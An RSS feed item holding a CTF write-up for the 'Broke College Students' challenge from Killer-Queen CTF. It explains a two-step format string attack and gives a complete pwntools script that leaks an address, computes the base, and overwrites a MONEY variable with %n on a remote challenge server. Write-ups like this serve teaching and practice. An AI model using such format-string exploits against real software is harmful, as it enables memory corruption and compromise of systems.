<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Hello Friend</title>
        <link>https://CTF-Writeups.github.io/posts/</link>
        <description>Recent content in Posts on Hello Friend</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Thu, 11 Mar 2021 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://CTF-Writeups.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Killer-Queen CTF: Broke College Students</title>
            <link>https://CTF-Writeups.github.io/posts/brokecollegestudents/</link>
            <pubDate>Thu, 11 Mar 2021 00:00:00 +0000</pubDate>
            
            <guid>https://CTF-Writeups.github.io/posts/brokecollegestudents/</guid>
            <description>Broke College Students Basic idea: Format string attack in two steps. Step 1: leak an address, find the same offset with objdump, add offset of MONEY &amp;ndash; result is real address of MONEY in memory, which we want to override. Step 2: Use format string to write 999999 characters followed by %n, allowing us to place that value in an address we specify afterwards &amp;ndash; so we specify the MONEY address to get that amount of money.</description>
            <content type="html"><![CDATA[<h1 id="broke-college-students">Broke College Students</h1>
<p>Basic idea:
Format string attack in two steps.
Step 1: leak an address, find the same offset with <code>objdump</code>, add offset of <code>MONEY</code> &ndash; result is real address of <code>MONEY</code> in memory, which we want to override.
Step 2: Use format string to write 999999 characters followed by <code>%n</code>, allowing us to place that value in an address we specify afterwards &ndash; so we specify the <code>MONEY</code> address to get that amount of money.
This allows us to buy the flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;143.198.184.186&#34;</span>, <span style="color:#ae81ff">5001</span>)
<span style="color:#75715e">#p = process(&#34;./brokecollegestudents&#34;)</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_string</span>(choice):
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
    p<span style="color:#f92672">.</span>recv()
    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
    p<span style="color:#f92672">.</span>sendline(choice)
    p<span style="color:#f92672">.</span>recvlines(<span style="color:#ae81ff">2</span>)
    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;What&#34;</span>)[<span style="color:#ae81ff">0</span>]


leaked_addr <span style="color:#f92672">=</span> int(send_string(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%8$p&#34;</span>)[<span style="color:#ae81ff">2</span>:], <span style="color:#ae81ff">16</span>)
log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;ADDRESS LEAK: </span><span style="color:#e6db74">{</span>hex(leaked_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

addr_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1160</span>
base_addr <span style="color:#f92672">=</span> leaked_addr <span style="color:#f92672">-</span> addr_offset
money_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401c</span>
money_addr <span style="color:#f92672">=</span> p64(base_addr <span style="color:#f92672">+</span> money_offset)

send_string(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;%99999999c%8$n__&#34;</span><span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> money_addr)

p<span style="color:#f92672">.</span>interactive()
</code></pre></div>]]></content>
        </item>
        
    </channel>
</rss>
